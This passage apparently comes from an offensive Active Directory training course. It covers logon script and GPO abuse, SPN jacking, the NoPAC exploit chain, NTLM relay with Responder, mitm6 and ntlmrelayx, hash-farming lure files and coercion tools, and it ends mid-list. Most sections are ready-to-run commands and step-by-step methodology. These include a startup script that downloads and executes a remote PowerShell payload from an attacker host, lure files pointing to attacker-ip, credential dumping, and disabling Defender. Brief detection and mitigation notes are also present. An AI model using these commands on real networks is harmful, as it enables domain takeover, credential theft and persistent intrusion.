The scriptPath attribute on a user object defines a logon script that executes when the user logs in. An attacker with write access to this attribute can point it to a malicious script hosted on a network share, achieving code execution in the context of the target user.

8.2.1 Logon Scripts

The scriptPath attribute on a user object defines a logon script that executes when the user logs in. An attacker with write access to this attribute can point it to a malicious script hosted on a network share, achieving code execution in the context of the target user.

scriptPath Attribute

The scriptPath attribute stores a relative path to a script in the NETLOGON share (\\domain\NETLOGON\). When a user logs in, Windows automatically maps the NETLOGON share and executes the script. The path can also be an absolute UNC path to any accessible share.

# Check the current scriptPath for a user
Get-ADUser -Identity targetuser -Properties scriptPath | Select-Object scriptPath

# Via LDAP
Get-ADUser -LDAPFilter "(scriptPath=*)" -Properties scriptPath | Select-Object samAccountName, scriptPath
Exploitation via WriteProperty

If the attacker has WriteProperty on the scriptPath attribute (or broader write rights like GenericAll/GenericWrite), they can set it to a UNC path pointing to a malicious script.

  1. Host a malicious script (e.g., a reverse shell or Beacon stager) on an attacker-controlled SMB share
  2. Modify the target user's scriptPath to point to the share
  3. Wait for the user to log in; the script executes in their session
Setting Logon Scripts via PowerView
# Set a logon script using PowerView
Set-DomainObject -Identity targetuser -Set @{scriptPath="\\attacker-share\scripts\payload.bat"} -Verbose

# Verify the change
Get-DomainUser -Identity targetuser -Properties scriptPath

# Alternative using Set-ADUser
Set-ADUser -Identity targetuser -ScriptPath "\\attacker-share\scripts\payload.bat"
Cleanup
# Clear the scriptPath attribute
Set-DomainObject -Identity targetuser -Clear scriptPath -Verbose

# Or restore the original value
Set-DomainObject -Identity targetuser -Set @{scriptPath="original_script.bat"}
OPSEC: scriptPath changes are logged in Directory Service Changes events (Event ID 5136). Prefer restoring the original value over clearing the attribute entirely, as a null value may trigger monitoring alerts.

8.2.2 SPN Jacking

SPN Jacking is a technique that combines write access over the servicePrincipalName attribute with Kerberoasting. By setting an SPN on a target account that does not already have one, the attacker makes it Kerberoastable and can then crack the service ticket offline to recover the plaintext password.

How SPN Jacking Works
  1. Identify a target user account with a weak password that does not have an SPN set
  2. Use write access (GenericAll, GenericWrite, WriteProperty on servicePrincipalName) to add an arbitrary SPN
  3. Request a Kerberos service ticket for the new SPN (Kerberoast)
  4. Crack the ticket offline to recover the password
  5. Remove the SPN to clean up
Prerequisites
  • Write access to the servicePrincipalName attribute on the target user
  • The target must be a user account (not a computer account, which already has SPNs)
  • The SPN chosen must not conflict with existing SPNs in the domain
Exploitation Steps
# Check if the target has any existing SPNs
Get-DomainUser -Identity targetuser -Properties servicePrincipalName

# Add a fake SPN using PowerView
Set-DomainObject -Identity targetuser -Set @{servicePrincipalName='http/fakeservice.corp.local'}

# Kerberoast the target
Rubeus.exe kerberoast /user:targetuser /nowrap

# Clean up: remove the SPN
Set-DomainObject -Identity targetuser -Clear servicePrincipalName
# From Linux with targeted Kerberoasting
python3 targetedKerberoast.py -d corp.local -u attacker -p 'Password123' --dc-ip 10.10.10.1

# Manual SPN addition with ldapmodify
# (modify targetuser, add servicePrincipalName: http/fakeservice.corp.local)
Detection
  • Event ID 5136 for servicePrincipalName attribute modifications
  • Monitor for SPNs being added and removed in short succession
  • Correlate SPN changes with subsequent TGS-REQ (Event ID 4769) for the same SPN
  • Audit which principals have write access to servicePrincipalName on sensitive accounts

Methodology

  • Enumerate existing logon scripts on target users: 
    Get-ADUser -LDAPFilter "(scriptPath=*)" -Properties scriptPath | Select-Object samAccountName, scriptPath
  • Host a malicious script (reverse shell or stager) on an attacker-controlled SMB share, then set the target user's scriptPath: 
    Set-DomainObject -Identity targetuser -Set @{scriptPath="\\attacker-share\scripts\payload.bat"} -Verbose
  • Wait for the target user to log in, then restore or clear the scriptPath: 
    Set-DomainObject -Identity targetuser -Set @{scriptPath="original_script.bat"}
  • For SPN Jacking, verify the target user has no existing SPNs: 
    Get-DomainUser -Identity targetuser -Properties servicePrincipalName
  • Add a fake SPN to make the account Kerberoastable: 
    Set-DomainObject -Identity targetuser -Set @{servicePrincipalName='http/fakeservice.corp.local'}
  • Kerberoast the target and crack the ticket offline: 
    Rubeus.exe kerberoast /user:targetuser /nowrap
  • Clean up by removing the SPN: 
    Set-DomainObject -Identity targetuser -Clear servicePrincipalName

8.3 sAMAccountName Spoofing

The NoPAC attack chain exploits CVE-2021-42278 and CVE-2021-42287 to impersonate any domain user, including Domain Admins, by manipulating the sAMAccountName attribute of a machine account. A standard domain user (with the default MachineAccountQuota of 10) can escalate to Domain Admin.

8.3.1 CVE-2021-42278 and CVE-2021-42287

  • CVE-2021-42278: The KDC does not validate that a machine account's sAMAccountName ends with $. An attacker can rename a machine account to match a privileged user's sAMAccountName.
  • CVE-2021-42287: When the KDC cannot find the account named in a TGT during S4U2self, it appends $ and searches again. If the original machine account has been renamed back, the KDC resolves the request against the target (e.g., the domain controller's machine account).

Combined, an attacker creates a machine account, renames it to a DC's sAMAccountName (without the $), requests a TGT, renames the machine account back, then uses the TGT for S4U2self to obtain a service ticket as any user.

8.3.2 Machine Account Manipulation

# Create a machine account (default MachineAccountQuota allows this)
New-MachineAccount -MachineAccount "FAKECOMP" -Password $(ConvertTo-SecureString 'FakePass123!' -AsPlainText -Force)

# Rename the machine account to match the DC's sAMAccountName (without $)
Set-MachineAccountAttribute -MachineAccount "FAKECOMP" -Value "DC01" -Attribute samaccountname

# Request a TGT as "DC01"
Rubeus.exe asktgt /user:DC01 /password:FakePass123! /domain:corp.local /dc:dc01.corp.local /nowrap

# Rename the machine account back
Set-MachineAccountAttribute -MachineAccount "FAKECOMP" -Value "FAKECOMP$" -Attribute samaccountname

# Use S4U2self with the TGT to get a service ticket as Domain Admin
Rubeus.exe s4u /impersonateuser:Administrator /self /altservice:cifs/dc01.corp.local /dc:dc01.corp.local /ptt /ticket:<tgt_base64>

8.3.3 Exploitation from Linux

# noPac.py (automated exploit)
python3 noPac.py corp.local/lowpriv:'Password123' -dc-ip 10.10.10.1 -dc-host dc01 --impersonate Administrator -dump

# sam-the-admin (alternative tool)
python3 sam_the_admin.py corp.local/lowpriv:'Password123' -dc-ip 10.10.10.1 -shell

8.3.4 Exploitation from Windows

# Using noPac.exe (C# port)
noPac.exe -domain corp.local -user lowpriv -pass "Password123" /dc dc01.corp.local /mAccount FAKECOMP /mPassword "FakePass123!" /service cifs /ptt

8.3.5 Mitigation

  • Apply Microsoft patches KB5008102 and KB5008380 (November 2021)
  • Set MachineAccountQuota to 0 to prevent standard users from creating machine accounts
  • Monitor Event ID 4741 (computer account created) and Event ID 4742 (computer account changed) for sAMAccountName modifications
  • Enable PAC validation on all services

Methodology

  • Create a machine account (requires MachineAccountQuota > 0): 
    New-MachineAccount -MachineAccount "FAKECOMP" -Password $(ConvertTo-SecureString 'FakePass123!' -AsPlainText -Force)
  • Rename the machine account to the DC's sAMAccountName (without the trailing $): 
    Set-MachineAccountAttribute -MachineAccount "FAKECOMP" -Value "DC01" -Attribute samaccountname
  • Request a TGT as the spoofed DC name: 
    Rubeus.exe asktgt /user:DC01 /password:FakePass123! /domain:corp.local /dc:dc01.corp.local /nowrap
  • Rename the machine account back so the KDC resolves the TGT to the real DC: 
    Set-MachineAccountAttribute -MachineAccount "FAKECOMP" -Value "FAKECOMP$" -Attribute samaccountname
  • Use S4U2self to obtain a service ticket impersonating a Domain Admin: 
    Rubeus.exe s4u /impersonateuser:Administrator /self /altservice:cifs/dc01.corp.local /dc:dc01.corp.local /ptt /ticket:<tgt_base64>
  • Linux automated alternative with noPac.py: 
    python3 noPac.py corp.local/lowpriv:'Password123' -dc-ip 10.10.10.1 -dc-host dc01 --impersonate Administrator -dump

8.4 GPO Attacks

Group Policy Objects (GPOs) are containers for policy settings applied to users and computers within an Active Directory domain. GPOs are linked to Sites, Domains, or Organizational Units (OUs) and processed during computer startup, user logon, and at periodic refresh intervals (default 90 minutes with a random offset of up to 30 minutes).

8.4.1 Introduction to Group Policy Objects

Group Policy Objects (GPOs) are containers for policy settings applied to users and computers within an Active Directory domain. GPOs are linked to Sites, Domains, or Organizational Units (OUs) and processed during computer startup, user logon, and at periodic refresh intervals (default 90 minutes with a random offset of up to 30 minutes).

Key GPO concepts:

  • GPO Structure: Each GPO has two components: a Group Policy Container (GPC) stored in AD (CN=Policies in the System container) and a Group Policy Template (GPT) stored on SYSVOL as a folder named by the GPO's GUID
  • Processing Order: Local Policy, Site, Domain, OU (LSDOU). Policies applied later override earlier ones. Enforced GPOs override Block Inheritance.
  • Security Filtering: By default, GPOs apply to Authenticated Users. Security filtering can restrict application to specific groups or users.
  • WMI Filters: Additional conditions (OS version, hardware specs) that determine whether a GPO applies to a given computer
# List all GPOs in the domain
Get-GPO -All | Select-Object DisplayName, Id, GpoStatus

# View GPO details
Get-GPOReport -Name "Default Domain Policy" -ReportType Html -Path .\gpo_report.html

# Check which OUs a GPO is linked to
Get-GPO -Name "Server Hardening" | ForEach-Object {
    $_ | Get-GPOReport -ReportType Xml | Select-Xml -XPath "//LinksTo" | ForEach-Object { $_.Node }
}

8.4.2 GPO Attacks

If an attacker gains write access to a GPO that is linked to an OU containing target computers or users, they can modify the GPO to achieve code execution, credential harvesting, or privilege escalation on all affected systems.

GPO Abuse Prerequisites
  • Write access to the GPO (GPC and GPT): typically via GenericAll, GenericWrite, or specific write permissions
  • The GPO must be linked to an OU containing target objects (computers or users)
  • The target objects must have Read and Apply Group Policy permissions (default for Authenticated Users)
# Enumerate GPO permissions with PowerView
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|GenericAll|GenericWrite" -and
    $_.SecurityIdentifier -match "S-1-5-21-.*-\d{4,}$"
} | Select-Object ObjectDN, ActiveDirectoryRights, SecurityIdentifier
Immediate Scheduled Tasks

The most common GPO abuse technique. An Immediate Scheduled Task runs once when Group Policy refreshes, executing an arbitrary command as SYSTEM (for computer configuration) or as the logged-on user (for user configuration).

# Using SharpGPOAbuse to add an immediate scheduled task
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author "NT AUTHORITY\SYSTEM" --Command "cmd.exe" --Arguments "/c net localgroup administrators attacker /add" --GPOName "Vulnerable GPO"

# Force a Group Policy refresh on the target
gpupdate /force
Computer Startup Scripts

Startup scripts execute when a computer boots, running as SYSTEM. Adding a malicious script to a GPO's startup scripts achieves code execution on all computers in the linked OU after the next reboot.

# Add a startup script via SharpGPOAbuse
SharpGPOAbuse.exe --AddComputerScript --ScriptName "update.bat" --ScriptContents "powershell -ep bypass -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')" --GPOName "Vulnerable GPO"
Restricted Groups

Restricted Groups policy controls local group membership. By modifying a GPO's Restricted Groups settings, an attacker can add a controlled user to the local Administrators group on all affected computers.

# Add a user to local Administrators via Restricted Groups
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount "attacker" --GPOName "Vulnerable GPO"
Registry Modification

GPOs can push registry modifications to target computers. An attacker can use this to disable security features, configure autoruns, or modify service configurations.

# Example: Disable Windows Defender via GPO registry preference
# Path: HKLM\SOFTWARE\Policies\Microsoft\Windows Defender
# Value: DisableAntiSpyware = 1

# Or add a Run key for persistence
# Path: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
# Value: Backdoor = "C:\Windows\Temp\payload.exe"
SharpGPOAbuse

SharpGPOAbuse is a C# tool that automates GPO modification for common attack scenarios.

FlagAction
--AddComputerTaskImmediate Scheduled Task (computer context, runs as SYSTEM)
--AddUserTaskImmediate Scheduled Task (user context)
--AddComputerScriptStartup script (runs at boot as SYSTEM)
--AddUserScriptLogon script (runs at user logon)
--AddLocalAdminAdd user to local Administrators via Restricted Groups
--AddNewRightsAdd user rights assignment (e.g., SeDebugPrivilege)
pyGPOAbuse

pyGPOAbuse provides equivalent functionality from Linux.

# Add an immediate scheduled task from Linux
python3 pygpoabuse.py corp.local/attacker:'Password123' -gpo-id "AB12CD34-EF56-7890-AB12-CD34EF567890" -command "net localgroup administrators attacker /add" -taskname "Update" -f

# Add a user to local Administrators
python3 pygpoabuse.py corp.local/attacker:'Password123' -gpo-id "AB12CD34-EF56-7890-AB12-CD34EF567890" -localadmin -useraccount attacker -f

Methodology

  • Enumerate GPOs with writable permissions: 
    Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|GenericAll|GenericWrite" -and
    $_.SecurityIdentifier -match "S-1-5-21-.*-\d{4,}$"
} | Select-Object ObjectDN, ActiveDirectoryRights, SecurityIdentifier
  • Add an Immediate Scheduled Task to push code execution as SYSTEM: 
    SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author "NT AUTHORITY\SYSTEM" --Command "cmd.exe" --Arguments "/c net localgroup administrators attacker /add" --GPOName "Vulnerable GPO"
  • Alternative: add a startup script for execution at next reboot: 
    SharpGPOAbuse.exe --AddComputerScript --ScriptName "update.bat" --ScriptContents "powershell -ep bypass -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')" --GPOName "Vulnerable GPO"
  • Alternative: add a user to local Administrators via Restricted Groups: 
    SharpGPOAbuse.exe --AddLocalAdmin --UserAccount "attacker" --GPOName "Vulnerable GPO"
  • Force a Group Policy refresh on the target: 
    gpupdate /force
  • Linux alternative using pyGPOAbuse: 
    python3 pygpoabuse.py corp.local/attacker:'Password123' -gpo-id "AB12CD34-EF56-7890-AB12-CD34EF567890" -command "net localgroup administrators attacker /add" -taskname "Update" -f

8.5 Detection and Mitigation

Advanced DACL attacks leave traces across multiple event logs. Comprehensive monitoring requires correlation between Directory Service Changes, Kerberos events, and GPO activity.

AttackEvent IDDetection Focus
Shadow Credentials5136Modifications to msDS-KeyCredentialLink; PKINIT (pre-auth type 16) from unusual accounts
Logon Scripts5136scriptPath attribute changes pointing to non-NETLOGON paths
SPN Jacking5136, 4769servicePrincipalName additions followed by TGS requests for the same SPN
NoPAC4741, 4742Machine account creation followed by sAMAccountName modification
GPO Abuse5136, 4688GPO modifications outside change windows; scheduled task and script execution from GPO paths

Key mitigations:

  • Least privilege: audit and remove unnecessary write permissions on sensitive attributes (msDS-KeyCredentialLink, scriptPath, servicePrincipalName, sAMAccountName)
  • MachineAccountQuota = 0: prevent standard users from creating machine accounts
  • GPO audit: restrict GPO modification rights to dedicated admin groups; enable Advanced Audit Policy for Directory Service Changes
  • Patch management: apply NoPAC patches (KB5008102, KB5008380) promptly
  • Protected Users: enroll sensitive accounts in the Protected Users group to block NTLM and enforce Kerberos with AES

9. NTLM Relay Attacks

NTLM relay attacks intercept an NTLM authentication attempt and forward it to a different service, allowing the attacker to act as the victim on that service. Unlike hash capture (where the attacker cracks the hash offline), relay attacks use the live authentication session and do not require knowing the victim's password. This module covers the NTLM protocol, relay mechanics, poisoning techniques, and advanced relay scenarios including cross-protocol attacks.

9.1 NTLM Authentication Protocol

NTLM (NT LAN Manager) is a challenge-response authentication protocol used when Kerberos is unavailable (e.g., when the target is specified by IP address rather than hostname, or when no Active Directory trust path exists). NTLM operates in three message exchanges:

  1. NEGOTIATE (Type 1): The client announces supported NTLM features and flags
  2. CHALLENGE (Type 2): The server responds with a random 8-byte challenge (nonce) and its own feature flags
  3. AUTHENTICATE (Type 3): The client responds with the challenge encrypted using a derivative of the user's NT hash, along with username and domain information

Two versions exist:

VersionHash TypeSecurityCracking Difficulty
NTLMv1NetNTLMv1Weak; uses DES-based challenge response; vulnerable to rainbow tablesLow (can be converted to NTLM hash via crack.sh)
NTLMv2NetNTLMv2Stronger; HMAC-MD5 with client nonce and timestampHigher (requires dictionary/brute force)

In domain environments, the server forwards the challenge and response to the DC for validation (pass-through authentication). For local accounts, the server validates directly against the local SAM database.

NetNTLM hashes are NOT the same as NT hashes. NetNTLM hashes (captured via Responder or relay) cannot be used for pass-the-hash attacks. They can only be cracked or relayed.

9.2 NTLM Relay Fundamentals

In an NTLM relay attack, the attacker positions themselves between a client and a server. When the client initiates NTLM authentication to the attacker (thinking it is a legitimate server), the attacker forwards the NEGOTIATE, CHALLENGE, and AUTHENTICATE messages to the actual target. The result is an authenticated session on the target as the victim user.

9.2.1 The NTLM Relay Attack

In an NTLM relay attack, the attacker positions themselves between a client and a server. When the client initiates NTLM authentication to the attacker (thinking it is a legitimate server), the attacker forwards the NEGOTIATE, CHALLENGE, and AUTHENTICATE messages to the actual target. The result is an authenticated session on the target as the victim user.

Key conditions for a successful relay:

  • No SMB signing on the target (for SMB relay). Signing binds the authentication to the specific session, preventing relay.
  • No LDAP signing/channel binding on the target (for LDAP relay)
  • The victim must have privileges on the target (e.g., local admin for SMB command execution, or write access for LDAP modifications)
  • The relay must be cross-protocol compatible or to a different host (same-host relay to SMB is blocked by default since MS08-068)
# Check which hosts have SMB signing disabled
crackmapexec smb 10.10.10.0/24 --gen-relay-list targets.txt

# Alternative with nmap
nmap --script smb2-security-mode -p 445 10.10.10.0/24

9.2.2 Pre-relay: Poisoning and Spoofing

Before relaying, the attacker must coerce or intercept an NTLM authentication attempt. Several techniques trigger victims to authenticate to an attacker-controlled host.

LLMNR, NBT-NS, and mDNS Poisoning (Responder)

When DNS resolution fails, Windows falls back to broadcast protocols: Link-Local Multicast Name Resolution (LLMNR), NetBIOS Name Service (NBT-NS), and multicast DNS (mDNS). Responder answers these broadcasts, directing victims to authenticate against the attacker.

# Run Responder in analyze mode first to observe traffic
sudo responder -I eth0 -A

# Run Responder to capture hashes
sudo responder -I eth0 -wFb

# Run Responder for relay (disable SMB and HTTP servers so ntlmrelayx can use those ports)
sudo responder -I eth0 -wFb --disable-ess -v
Note: When using Responder with ntlmrelayx, disable Responder's built-in SMB and HTTP servers (edit Responder.conf: set SMB = Off and HTTP = Off) so they do not conflict with ntlmrelayx listeners.
ARP Spoofing

ARP spoofing poisons the ARP cache on the local subnet, redirecting traffic through the attacker's machine. This enables interception of NTLM authentication attempts on the network segment.

# ARP spoof using arpspoof (part of dsniff)
sudo arpspoof -i eth0 -t 10.10.10.50 10.10.10.1

# Or with bettercap
sudo bettercap -iface eth0 -eval "set arp.spoof.targets 10.10.10.50; arp.spoof on"
DHCPv6 Poisoning (mitm6)

mitm6 exploits the fact that Windows prefers IPv6 over IPv4. It responds to DHCPv6 requests, setting the attacker as the default DNS server for IPv6. Subsequent DNS queries go through the attacker, who can redirect them to trigger NTLM authentication.

# Run mitm6 targeting a specific domain
sudo mitm6 -d corp.local

# Combine with ntlmrelayx for LDAP relay
sudo ntlmrelayx.py -6 -t ldaps://dc01.corp.local -wh fakewpad.corp.local -l lootdir
WebDAV Requests

WebDAV (Web Distributed Authoring and Versioning) is enabled by default on many Windows systems via the WebClient service. When a UNC path with a non-standard port or an HTTP URL is accessed, Windows uses WebDAV, which sends NTLM authentication over HTTP. This is significant because HTTP-based NTLM can be relayed to LDAP (unlike SMB-based NTLM when EPA is enabled).

# Check if WebClient service is running on target hosts
crackmapexec smb 10.10.10.0/24 -d corp.local -u user -p 'Pass' -M webdav

# Trigger WebDAV authentication
# Use @port syntax in UNC path: \\attacker@8080\share\file

Methodology

  • Enumerate hosts with SMB signing disabled: 
    crackmapexec smb 10.10.10.0/24 --gen-relay-list targets.txt
  • Confirm SMB signing status with nmap: 
    nmap --script smb2-security-mode -p 445 10.10.10.0/24
  • Run Responder in analyze mode to observe broadcast traffic: 
    sudo responder -I eth0 -A
  • Configure Responder for relay (disable built-in SMB/HTTP in Responder.conf), then start: 
    sudo responder -I eth0 -wFb --disable-ess -v
  • Run mitm6 for DHCPv6 poisoning combined with LDAP relay: 
    sudo mitm6 -d corp.local
sudo ntlmrelayx.py -6 -t ldaps://dc01.corp.local -wh fakewpad.corp.local -l lootdir
  • Check for WebClient service on target hosts (WebDAV availability): 
    crackmapexec smb 10.10.10.0/24 -d corp.local -u user -p 'Pass' -M webdav

9.3 SMB Relay and Advanced Cases

SMB relay is the classic NTLM relay scenario. The attacker relays captured NTLM authentication to an SMB service on a target where signing is not required.

9.3.1 NTLM Relay over SMB Attacks

SMB relay is the classic NTLM relay scenario. The attacker relays captured NTLM authentication to an SMB service on a target where signing is not required.

ntlmrelayx.py Setup
# Basic ntlmrelayx setup with a target list
sudo ntlmrelayx.py -tf targets.txt -smb2support

# With specific target
sudo ntlmrelayx.py -t smb://10.10.10.50 -smb2support
Relaying to SMB (Command Execution)

If the relayed user has local administrator privileges on the target, ntlmrelayx can execute commands via the SMB service.

# Execute a command on successful relay
sudo ntlmrelayx.py -t smb://10.10.10.50 -smb2support -c "whoami"

# Execute a PowerShell payload
sudo ntlmrelayx.py -t smb://10.10.10.50 -smb2support -c "powershell -ep bypass -e <base64_payload>"
Relaying to SMB (Secretsdump)
# Dump SAM, LSA secrets, and cached credentials on relay
sudo ntlmrelayx.py -t smb://10.10.10.50 -smb2support --dump-lsa --dump-sam
SMB Signing Requirements

SMB signing protects against relay by cryptographically binding authentication to the session. Signing status:

SystemDefault Signing
Domain ControllersRequired (cannot relay to DCs via SMB)
Servers (non-DC)Supported but not required
WorkstationsSupported but not required
Note: Starting with Windows 11 24H2 and Windows Server 2025, Microsoft has enabled SMB signing by default for all connections, significantly reducing the attack surface for SMB relay.

9.3.2 NTLMRelayx Advanced Use Cases

Interactive SMB Shell
# Start ntlmrelayx with interactive mode
sudo ntlmrelayx.py -t smb://10.10.10.50 -smb2support -i

# Connect to the interactive shell (ntlmrelayx opens a local port)
nc 127.0.0.1 11000
# Then use SMB commands: shares, use C$, ls, get, put, etc.
SOCKS Proxy

ntlmrelayx can maintain relayed sessions as SOCKS proxies, allowing tools like secretsdump.py, smbclient, or crackmapexec to use the authenticated session.

# Start ntlmrelayx with SOCKS support
sudo ntlmrelayx.py -tf targets.txt -smb2support -socks

# Use the SOCKS proxy with proxychains
# Edit /etc/proxychains4.conf: socks4 127.0.0.1 1080
proxychains secretsdump.py -no-pass corp.local/admin@10.10.10.50
proxychains smbclient.py -no-pass corp.local/admin@10.10.10.50
LDAP Relay

Relaying to LDAP allows the attacker to perform directory modifications (add users, modify ACLs, configure RBCD) if the relayed account has sufficient privileges.

# Relay to LDAP and delegate access for RBCD
sudo ntlmrelayx.py -t ldap://dc01.corp.local --delegate-access

# Relay to LDAPS with escalation via ACL abuse
sudo ntlmrelayx.py -t ldaps://dc01.corp.local --escalate-user attacker
LDAP signing and channel binding: LDAP relay requires that the DC does not enforce LDAP signing (LdapServerIntegrity = 1, not 2) or channel binding. LDAPS (port 636) does not enforce signing but may enforce channel binding.
Shadow Credentials via Relay

Combining NTLM relay with Shadow Credentials allows the attacker to add a key credential to a computer account, then use PKINIT to obtain a TGT.

# Relay to LDAP and set shadow credentials on the target machine account
sudo ntlmrelayx.py -t ldap://dc01.corp.local --shadow-credentials --shadow-target WS01$

Methodology

  • Start ntlmrelayx for basic SMB relay with a target list: 
    sudo ntlmrelayx.py -tf targets.txt -smb2support
  • Relay for command execution (requires relayed user to be local admin on target): 
    sudo ntlmrelayx.py -t smb://10.10.10.50 -smb2support -c "whoami"
  • Relay for credential dumping (SAM and LSA secrets): 
    sudo ntlmrelayx.py -t smb://10.10.10.50 -smb2support --dump-lsa --dump-sam
  • Use interactive SMB shell mode, then connect via netcat: 
    sudo ntlmrelayx.py -t smb://10.10.10.50 -smb2support -i
nc 127.0.0.1 11000
  • Enable SOCKS proxy for persistent relay sessions: 
    sudo ntlmrelayx.py -tf targets.txt -smb2support -socks
proxychains secretsdump.py -no-pass corp.local/admin@10.10.10.50
  • Relay to LDAP for RBCD delegation: 
    sudo ntlmrelayx.py -t ldap://dc01.corp.local --delegate-access
  • Relay to LDAP for Shadow Credentials: 
    sudo ntlmrelayx.py -t ldap://dc01.corp.local --shadow-credentials --shadow-target WS01$

9.4 Cross-protocol and Coercion Attacks

NTLM authentication can be relayed across different protocols because the challenge-response mechanism is protocol-independent. The attacker receives NTLM authentication on one protocol and forwards it to a service using a different protocol.

9.4.1 NTLM Cross-protocol Relay Attacks

NTLM authentication can be relayed across different protocols because the challenge-response mechanism is protocol-independent. The attacker receives NTLM authentication on one protocol and forwards it to a service using a different protocol.

HTTP to SMB

Capture NTLM authentication over HTTP (e.g., via WPAD, WebDAV, or a phishing link) and relay to SMB for command execution or credential dumping.

# Capture HTTP NTLM and relay to SMB
sudo ntlmrelayx.py -t smb://10.10.10.50 -smb2support
# Trigger HTTP auth via a link: http://attacker/test
HTTP to LDAP

HTTP-based NTLM authentication can be relayed to LDAP even when LDAP channel binding is enforced (since HTTP does not carry channel binding information). This makes HTTP-to-LDAP a particularly valuable relay path.

# Relay HTTP auth to LDAP for delegation attack
sudo ntlmrelayx.py -t ldap://dc01.corp.local --delegate-access
SMB to HTTP

Relay SMB-based NTLM to HTTP services (e.g., Exchange Web Services, AD CS web enrollment). Useful when SMB signing blocks SMB-to-SMB relay.

# Relay SMB auth to ADCS HTTP enrollment (ESC8)
sudo ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
WebDAV to LDAP

WebDAV authentication sends NTLM over HTTP, which can be relayed to LDAP. This is the foundation for attacks like PetitPotam + RBCD delegation via LDAP.

# Coerce WebDAV authentication and relay to LDAP
# Step 1: Start ntlmrelayx targeting LDAP
sudo ntlmrelayx.py -t ldap://dc01.corp.local --delegate-access --escalate-user attacker

# Step 2: Coerce authentication via PetitPotam using the WebDAV port trick
python3 PetitPotam.py -d corp.local -u user -p 'Pass' attacker@8080/test 10.10.10.50
DCOM/RPC to LDAP

Some DCOM/RPC calls trigger NTLM authentication that can be relayed. KrbRelayUp leverages local DCOM calls for privilege escalation by relaying to LDAP on the local DC.

9.4.2 Farming Hashes

Hash farming places files on network shares or sends documents that, when accessed by a victim, trigger an automatic NTLM authentication attempt to an attacker-controlled host. These techniques are passive; the attacker places the lure and waits.

SCF Files

Shell Command Files (.scf) are processed by Windows Explorer when browsing a directory. The icon path can point to a UNC path, triggering NTLM authentication.

# Create a malicious SCF file
cat > @harvest.scf << 'ENDSCF'
[Shell]
Command=2
IconFile=\\attacker-ip\share\icon.ico
[Taskbar]
Command=ToggleDesktop
ENDSCF

# Place on a writable share and wait for a user to browse the directory
URL Files

Internet Shortcut files (.url) can reference a UNC path for their icon, triggering NTLM authentication when rendered by Explorer.

# Create a malicious URL file
cat > @harvest.url << 'ENDURL'
[InternetShortcut]
URL=http://attacker-ip
IconIndex=0
IconFile=\\attacker-ip\share\icon.ico
ENDURL
Desktop.ini

A desktop.ini file in a folder customizes its icon and display properties. Pointing the icon to a UNC path triggers authentication when the folder is browsed.

# Create a malicious desktop.ini
cat > desktop.ini << 'ENDINI'
[.ShellClassInfo]
IconResource=\\attacker-ip\share\icon.ico,0
ENDINI

# Set the folder as a system folder (required for desktop.ini to be processed)
attrib +s target_folder
Shortcut Files (.lnk)

Windows shortcut files can reference a UNC path for their icon. When rendered in Explorer, the system fetches the icon, sending NTLM credentials.

# Create a malicious LNK file via PowerShell
$wsh = New-Object -ComObject WScript.Shell
$lnk = $wsh.CreateShortcut("C:\share\@harvest.lnk")
$lnk.TargetPath = "\\attacker-ip\share"
$lnk.IconLocation = "\\attacker-ip\share\icon.ico, 0"
$lnk.Save()
Office Documents

Microsoft Office documents can embed UNC references that trigger NTLM authentication when opened. Common techniques:

  • Linked images: Insert an image with a UNC path source
  • Template injection: Reference a remote .dotx template via UNC
  • OLE objects: Embed an OLE link to a UNC path
  • Excel web queries: .iqy files that point to UNC paths

9.4.3 Authentication Coercion

Authentication coercion forces a target machine (often a domain controller) to initiate NTLM authentication to an attacker-controlled host. Unlike hash farming (which relies on user interaction), coercion uses Windows RPC interfaces to trigger machine account authentication.

PrinterBug (MS-RPRN)

The Print Spooler service (MS-RPRN) exposes the RpcRemoteFindFirstPrinterChangeNotificationEx method, which causes the target to authenticate back to a specified host. This works against any machine running the Spooler service, including domain controllers.

# Trigger the Printer Bug from Linux
python3 printerbug.py corp.local/user:'Password123'@dc01.corp.local attacker-ip

# Using SpoolSample from Windows
SpoolSample.exe dc01.corp.local attacker-ip

# Using dementor.py
python3 dementor.py -d corp.local -u user -p 'Password123' attacker-ip dc01.corp.local
PetitPotam (MS-EFSR)

PetitPotam abuses the Encrypting File System Remote (MS-EFSR) protocol to coerce authentication. Unlike PrinterBug, it works even on systems where the Print Spooler is disabled. Unauthenticated coercion was patched but authenticated coercion still works.

# PetitPotam (authenticated)
python3 PetitPotam.py -d corp.local -u user -p 'Password123' attacker-ip dc01.corp.local

# PetitPotam (unauthenticated, pre-patch)
python3 PetitPotam.py attacker-ip dc01.corp.local
DFSCoerce

DFSCoerce uses the Distributed File System (MS-DFSNM) RPC interface to coerce NTLM authentication from a target.

# DFSCoerce
python3 dfscoerce.py -d corp.local -u user -p 'Password123' attacker-ip dc01.corp.local
Coercer Tool

Coercer is a consolidated tool that tests multiple coercion methods (MS-RPRN, MS-EFSR, MS-DFSNM, MS-FSRVP, and others) against a target.

# Scan for all available coercion methods
python3 coercer.py scan -t dc01.corp.local -u user -p 'Password123' -d corp.local

# Coerce authentication using all available methods
python3 coercer.py coerce -t dc01.corp.local -l attacker-ip -u user -p 'Password123' -d corp.local

Methodology

  • Relay HTTP-captured NTLM auth to LDAP for delegation attack: 
    sudo ntlmrelayx.py -t ldap://dc01.corp.local --delegate-access
  • Relay SMB auth to ADCS HTTP enrollment (ESC8): 
    sudo ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
  • Place hash-farming lure files on a writable share (SCF file): 
    cat > @harvest.scf << 'ENDSCF'
[Shell]
Command=2
IconFile=\\attacker-ip\share\icon.ico
[Taskbar]
Command=ToggleDesktop
ENDSCF
  • Create a malicious .url file as an alternative lure: 
    cat > @harvest.url << 'ENDURL'
[InternetShortcut]
URL=http://attacker-ip
IconIndex=0
